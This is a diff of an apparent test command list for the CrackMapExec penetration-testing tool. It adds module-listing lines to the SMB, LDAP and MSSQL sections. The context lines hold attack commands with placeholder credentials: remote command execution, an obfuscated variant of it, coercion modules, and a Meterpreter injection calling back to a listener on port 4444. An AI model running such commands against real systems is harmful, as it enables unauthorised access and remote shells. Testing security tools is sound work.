@@ -22,6 +22,7 @@ crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -X whoami
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -X whoami --obfs
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS --wmi "os get"
 ##### SMB Modules
+crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -L
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M bh_owned
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M dfscoerce
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M drop-sc
@@ -139,6 +140,7 @@ crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS --trusted-for-delegati
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS --admin-count
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS --gmsa
 ##### LDAP Modules
+crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS -L
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS -M adcs
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS -M adcs --options
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS -M daclread
@@ -170,6 +172,7 @@ crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS
 crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS
 ##### MSSQL Modules
 # crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M empire_exec
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -L
 crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M met_inject -o SRVHOST=127.0.0.1 SRVPORT=4444 RAND=12345
 crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M met_inject --options
 crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M mssql_priv
